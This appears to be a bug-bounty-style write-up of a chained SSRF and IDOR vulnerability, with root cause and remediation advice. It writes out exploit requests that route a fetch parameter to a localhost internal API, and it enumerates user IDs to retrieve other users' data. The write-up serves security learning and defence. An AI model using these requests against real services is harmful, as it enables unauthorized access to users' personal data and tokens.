# 🔥 Chained Vulnerability: SSRF → IDOR → Sensitive Data Exposure

## 🧩 Summary

A chained attack was identified combining SSRF (Server-Side Request Forgery) with IDOR (Insecure Direct Object Reference), leading to unauthorized access to sensitive user data from internal services.

---

## 🎯 Impact

* Access to internal APIs not publicly exposed
* Unauthorized retrieval of other users’ data
* Potential account takeover depending on exposed data
* High severity due to multi-step exploitation

---

## 🔗 Attack Chain Overview

1. SSRF allows access to internal API
2. Internal API lacks proper authorization (IDOR)
3. Attacker retrieves sensitive user data

---

## 🔍 Step 1: SSRF Vulnerability

### Vulnerable Endpoint

```
GET /fetch?url=https://example.com
```

### Exploitation

```
GET /fetch?url=http://127.0.0.1:8080/api/users?id=1
```

✅ The server makes the request internally and returns the response.

---

## 🔍 Step 2: Internal API Discovery

Using SSRF, internal endpoints were discovered:

```
http://127.0.0.1:8080/api/users?id=1
http://127.0.0.1:8080/api/users?id=2
```

---

## 🔍 Step 3: IDOR Exploitation

The internal API does not validate user authorization.

### Example:

```
GET /api/users?id=1 → returns user1 data
GET /api/users?id=2 → returns user2 data
```

⚠️ No authentication or authorization checks detected.

---

## 💥 Full Exploit

```
GET /fetch?url=http://127.0.0.1:8080/api/users?id=2 HTTP/1.1
Host: target.com
```

📌 Result:

* Attacker receives sensitive data of another user via SSRF + IDOR

---

## 🧪 Additional Exploitation

* Enumerate multiple user IDs:

```
?id=1,2,3,4...
```

* Potential data exposed:

  * Emails
  * Usernames
  * Tokens (depending on API)

---

## 🛡️ Root Cause

1. SSRF: No validation on user-supplied URLs
2. IDOR: Missing authorization checks on internal API

---

## 🔒 Remediation

### SSRF Fix

* Restrict outbound requests (allowlist only)
* Block internal IP ranges (127.0.0.1, 169.254.x.x)

### IDOR Fix

* Enforce proper authentication & authorization
* Validate user ownership before returning data

---

## 🧠 Lessons Learned

* Chaining low/medium vulnerabilities can lead to critical impact
* Internal services are often less protected
* Always test SSRF beyond basic exploitation

---

## 📌 Severity

**High / Critical** due to combined exploitation and sensitive data exposure
